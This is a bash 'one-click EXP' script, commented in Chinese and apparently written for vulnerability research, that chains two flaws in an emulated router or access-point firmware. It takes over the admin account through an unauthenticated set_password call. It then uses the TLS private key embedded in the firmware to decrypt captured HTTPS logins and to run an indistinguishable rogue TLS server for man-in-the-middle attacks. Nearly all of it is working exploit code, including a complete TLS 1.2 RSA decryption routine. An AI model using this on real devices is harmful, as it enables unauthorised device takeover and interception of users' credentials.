#!/bin/bash
# =========================================================================
# TL-N7AP7200DT F-02(固件TLS私钥) + F-03(未授权出厂接管) 组合漏洞一键 EXP
# 在 VM (192.168.135.137) 内运行:   bash exp.sh [新口令]
# =========================================================================
PASSWORD="${1:-Attacker#123}"
FWD_HTTP=8081
FWD_HTTPS=8443
KEY=/tmp/irfs/etc/httpd/server_private.key
CRT=/tmp/irfs/etc/httpd/server.crt
CAP=/tmp/exp_cap.pcap
export LC_ALL=C.UTF-8 2>/dev/null || true
if [ "$(id -u)" = "0" ]; then
  S() { "$@"; }
else
  S() { echo iot | sudo -S -p '' "$@"; }
fi

echo "================================================================"
echo " 组合漏洞一键 EXP — 自动四步:"
echo "   [1] 侦察出厂状态   [2] 未授权 set_password 接管"
echo "   [3] 被动解密HTTPS  [4] 主动冒充设备TLS"
echo "================================================================"

# ---------- getAuthPwd (前端自定义编码, 内嵌实现) ----------
EN() {
python3 -c '
import sys
K="yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"
E="RDpbLfCPsJZ7fiv"
t=sys.argv[1]
print("".join(K[((ord(t[d]) if d<len(t) else 187)^(ord(E[d]) if d<len(E) else 187))%len(K)] for d in range(max(len(t),len(E)))))
' "$1"
}

# ---------- ds 请求 (内嵌 python) ----------
ds() { # $1=json body
python3 -c '
import sys, json, socket
body = json.dumps(json.loads(sys.argv[1])).encode()
s = socket.create_connection(("127.0.0.1", int(sys.argv[2])), 10)
req = (b"POST /ds HTTP/1.1\r\nHost: 192.168.1.254\r\nContent-Type: application/json\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n" + body)
s.sendall(req); resp = b""
while True:
    try: c = s.recv(4096)
    except Exception: break
    if not c: break
    resp += c
s.close()
b = resp.split(b"\r\n\r\n",1)[1] if b"\r\n\r\n" in resp else resp
try: print(json.dumps(json.loads(b)))
except Exception: print(b[:160])
' "$1" "$FWD_HTTP"
}

# ---------- 健康检查, dms 挂了就重启 qemu ----------
health() { curl -s -m 5 -X POST -H "Content-Type: application/json" -d '{"method":"get","system":{"name":"sys"}}' http://127.0.0.1:$FWD_HTTP/ds 2>/dev/null | grep -q error_code; }
if ! health; then
  echo "[!] 仿真 dms 无响应，自动重启 qemu（约 2 分钟）..."
  S pkill -f qemu-system-aarch64 2>/dev/null; sleep 3
  S rm -f /tmp/qemu.pid
  S qemu-system-aarch64 -M virt -cpu cortex-a72 -smp 2 -m 2048 \
    -kernel /tmp/alpine/Image -initrd /tmp/initramfs.cpio.gz \
    -append 'console=ttyAMA0,115200n8 panic=10' \
    -netdev user,id=n0,net=192.168.1.0/24,hostfwd=tcp:127.0.0.1:${FWD_HTTP}-192.168.1.254:80,hostfwd=tcp:127.0.0.1:${FWD_HTTPS}-192.168.1.254:443 \
    -device virtio-net-pci,netdev=n0 -display none -vga none \
    -serial tcp:127.0.0.1:4555,server=on,wait=off -monitor tcp:127.0.0.1:4556,server=on,wait=off \
    -pidfile /tmp/qemu.pid -daemonize
  for i in $(seq 1 24); do sleep 10; health && { echo "[+] 仿真已恢复 (${i}0s)"; break; }; echo "    等待 web 就绪... (${i}0s)"; done
  health || { echo "[-] 重启后仍未就绪, 人工排查"; exit 1; }
fi

echo; echo "[步骤1] 侦察出厂状态: system/sys"
ds '{"method":"get","system":{"name":"sys"}}'

echo; echo "[步骤2] F-03 未授权接管: uhttpd/set_password"
E1=$(EN "$PASSWORD"); E2=$(EN "${PASSWORD}_v")
ds "{\"method\":\"do\",\"uhttpd\":{\"name\":\"set_password\",\"username\":\"admin\",\"password\":\"$E1\"}}"
echo "[步骤2b] 接管验证(认证端点 chg_pwd):"
ds "{\"method\":\"do\",\"system\":{\"name\":\"chg_pwd\",\"username\":\"admin\",\"old_password\":\"$E1\",\"password\":\"$E2\"}}"

echo; echo "[步骤3] F-02 被动解密: 抓包 HTTPS 登录 + 固件私钥解密"
S pkill -9 tcpdump 2>/dev/null; S rm -f "$CAP" /tmp/tcpdump.log
S timeout 15 tcpdump -i lo -w "$CAP" -s0 "tcp port $FWD_HTTPS" 2>/tmp/tcpdump.log &
TCPPID=$!
sleep 2
BODY="{\"method\": \"do\", \"uhttpd\": {\"name\": \"login\", \"username\": \"admin\", \"password\": \"$(EN "$PASSWORD")\"}}"
REQ=/tmp/exp_req_$$.bin
python3 -c '
import sys
body = sys.argv[1].encode()
open(sys.argv[2],"wb").write(b"POST /ds HTTP/1.1\r\nHost: 192.168.1.254\r\nContent-Type: application/json\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: close\r\n\r\n"+body)
' "$BODY" "$REQ"
timeout 15 openssl s_client -legacy_renegotiation -connect 127.0.0.1:$FWD_HTTPS -quiet -cipher 'ALL:@SECLEVEL=0' < "$REQ" 2>/dev/null | tail -1
rm -f "$REQ"
wait $TCPPID 2>/dev/null
S chmod 644 "$CAP" 2>/dev/null
PKTS=0
for i in $(seq 1 8); do
  sleep 2
  PKTS=$(tcpdump -r "$CAP" -n 2>/dev/null | wc -l)
  PKTS=${PKTS:-0}
  [ "$PKTS" -ge 15 ] && break
done
echo "    抓包共 $PKTS 个数据包"
[ "$PKTS" -lt 10 ] && cat /tmp/tcpdump.log
python3 - "$CAP" "$KEY" "$FWD_HTTPS" <<'PYEOF'
import sys, struct, hashlib, hmac
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, AES
pcap, key, port = sys.argv[1], sys.argv[2], int(sys.argv[3])
def prf(secret, label, seed, n):
    out=b''; A=label+seed
    while len(out)<n:
        A=hmac.new(secret,A,hashlib.sha256).digest()
        out+=hmac.new(secret,A+label+seed,hashlib.sha256).digest()
    return out[:n]
data=open(pcap,'rb').read(); off=24; pkts={}
while off+16<=len(data):
    _,_,cap,_=struct.unpack_from('<IIII',data,off); off+=16
    f=data[off:off+cap]; off+=cap
    if len(f)<54 or f[12:14]!=b'\x08\x00': continue
    ihl=(f[14]&15)*4
    if f[14+9]!=6: continue
    tot=struct.unpack_from('>H',f,14+2)[0]; t=14+ihl
    sport,dport,seq,_=struct.unpack_from('>HHII',f,t)
    hl=(f[t+12]>>4)*4; pl=f[t+hl:14+tot]
    if dport!=port and sport!=port: continue
    k=(seq,len(pl),dport==port)
    if k not in pkts: pkts[k]=pl
def reas(c2s):
    segs=sorted([(s,p) for (s,l,c),p in pkts.items() if c==c2s]); buf={}
    for s,p in segs:
        r=s-segs[0][0]
        for i,b in enumerate(p): buf[r+i]=b
    if not buf: return b''
    return bytes(buf.get(i,0) for i in range(min(buf),max(buf)+1))
c2s,s2c=reas(True),reas(False)
def recs(buf):
    i=0
    while i+5<=len(buf):
        ct=buf[i]; ln=struct.unpack_from('>H',buf,i+3)[0]
        yield ct,buf[i+5:i+5+ln]; i+=5+ln
def hs(buf):
    i=0
    while i+4<=len(buf):
        ht=buf[i]; ln=struct.unpack_from('>I',b'\0'+buf[i+1:i+4])[0]
        yield ht,buf[i+4:i+4+ln]; i+=4+ln
cr=sr=enc=None; app=[]; hsc=b''; hss=b''
for ct,b in recs(c2s):
    if ct==22: hsc+=b
    elif ct==23: app.append(b)
for ct,b in recs(s2c):
    if ct==22: hss+=b
for ht,m in hs(hsc):
    if ht==1: cr=m[2:34]
    if ht==16: enc=m
for ht,m in hs(hss):
    if ht==2: sr=m[2:34]
rsa=RSA.importKey(open(key).read()); cip=PKCS1_v1_5.new(rsa); ksz=rsa.size_in_bytes()
pre=None
for cand in (enc[:ksz],enc[-ksz:],enc[2:2+ksz]):
    try: pre=cip.decrypt(cand,None)
    except Exception: pre=None
    if pre and len(pre)==48 and pre[:2]==b'\x03\x03': break
if not pre:
    print('    [!] premaster 解密失败'); sys.exit(0)
master=prf(pre,b'master secret',cr+sr,48)
kb=prf(master,b'key expansion',sr+cr,160)
ckey,civ=kb[64:96],kb[128:144]
plain=b''; iv=civ
for rec in app:
    dec=AES.new(ckey,AES.MODE_CBC,iv).decrypt(rec)
    plain+=dec[:-(dec[-1]+1)]; iv=rec[-16:]
print('=== 解密明文 (client->server) ===')
print(''.join(chr(b) if 32<=b<127 or b in (10,13,9) else '.' for b in plain))
PYEOF

echo; echo "[步骤4] F-02 主动冒充: 固件证书起 rogue TLS 与真机指纹比对"
S pkill -f 's_server -cert' 2>/dev/null; sleep 1
S setsid openssl s_server -cert "$CRT" -key "$KEY" -port 9444 -www -cipher 'ALL:@SECLEVEL=0' </dev/null >/dev/null 2>&1 &
sleep 2
FP_R=$(echo | timeout 10 openssl s_client -legacy_renegotiation -connect 127.0.0.1:9444 -cipher 'ALL:@SECLEVEL=0' 2>/dev/null | openssl x509 -noout -fingerprint -sha256)
FP_T=$(echo | timeout 10 openssl s_client -legacy_renegotiation -connect 127.0.0.1:$FWD_HTTPS -cipher 'ALL:@SECLEVEL=0' 2>/dev/null | openssl x509 -noout -fingerprint -sha256)
S pkill -f 's_server -cert' 2>/dev/null
echo "       rogue 指纹: $FP_R"
echo "       真机 指纹: $FP_T"
[ "${FP_R##*=}" = "${FP_T##*=}" ] && [ -n "$FP_R" ] && echo "[+] 指纹一致, 冒充不可区分 —— F-02 主动 MITM 成立" || echo "[-] 指纹不一致或获取失败"
echo; echo "[*] 完成"
